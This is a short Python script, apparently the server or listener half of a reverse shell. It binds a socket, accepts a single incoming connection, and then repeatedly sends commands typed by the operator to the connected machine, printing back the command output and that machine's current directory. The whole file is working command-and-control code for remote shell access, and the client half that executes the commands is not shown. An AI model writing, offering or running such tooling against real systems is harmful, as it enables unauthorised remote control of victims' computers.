from os import error, sep
import sys
import socket
from addresses import host, port

server_host = host
server_port = port

BUFFER_SIZE = 1024*128 # max size of messages = 128KB
SEPARATOR = "<sep>"

try:
    server_socket = socket.socket() # (socket.AF_INET,socket.SOCK_STREAM)
    server_socket.bind((server_host,server_port))
except socket.error as err:
    print("Operation failed REASON: "+str(err))
    sys.exit()

# currently this server_socket listens only once, later the multithreading will be added
server_socket.listen(5)
print(f"Listening as {server_host} on port {server_port}")

client_socket,client_address = server_socket.accept()
cwd = client_socket.recv(BUFFER_SIZE).decode()
print("[+] current working directory : ", cwd)

while True:
    command = input(f"{cwd}$ ")
    if not command.strip(): continue
    client_socket.send(command.encode())
    if command.lower() in ['exit','q']: break

    output = client_socket.recv(BUFFER_SIZE).decode()
    results,cwd = output.split(SEPARATOR)
    print(results)

print("listner stopped")
